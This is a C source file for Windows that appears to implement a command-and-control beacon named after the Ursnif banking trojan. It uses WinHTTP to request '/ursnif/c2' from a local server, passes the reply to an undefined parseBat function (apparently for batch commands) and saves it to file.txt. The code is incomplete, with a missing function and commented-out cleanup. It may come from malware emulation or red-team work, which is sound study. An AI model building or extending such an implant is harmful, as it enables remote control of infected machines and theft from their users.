#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <winhttp.h>


int loop()
{
    // Initialize WinHTTP
    HINTERNET hSession = WinHttpOpen(L"WinHTTP Example/1.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession == NULL) {
        printf("WinHttpOpen failed\n");
        return 1;
    }
    
    // Connect to server
    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 
        5000, 0);
    if (hConnect == NULL) {
        printf("WinHttpConnect failed\n");
        WinHttpCloseHandle(hSession);
        return 1;
    }
    
    // Open request
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/ursnif/c2", 
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
        WINHTTP_FLAG_REFRESH);
    if (hRequest == NULL) {
        printf("WinHttpOpenRequest failed\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    
    // Send request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("WinHttpSendRequest failed\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    
    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("WinHttpReceiveResponse failed\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    
    // Get content length
    DWORD content_length = 0;
    DWORD buffer_length = sizeof(content_length);
    if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | 
        WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &content_length,
        &buffer_length, WINHTTP_NO_HEADER_INDEX)) {
        printf("WinHttpQueryHeaders failed\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    
    // Allocate buffer
    BYTE* buffer = (BYTE*)malloc(content_length);
    if (buffer == NULL) {
        printf("Memory allocation failed\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    
    // Read response
    DWORD bytes_read = 0;
    if (!WinHttpReadData(hRequest, buffer, content_length, &bytes_read)) {
        printf("WinHttpReadData failed\n");
        free(buffer);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    
    parseBat((char*) buffer);

    // Write content to file
    FILE* file = fopen("file.txt", "wb");
    fwrite(buffer, 1, bytes_read, file);
    fclose(file);
    
    // Cleanup
    free(buffer);
    //WinHttpCloseHandle();
}
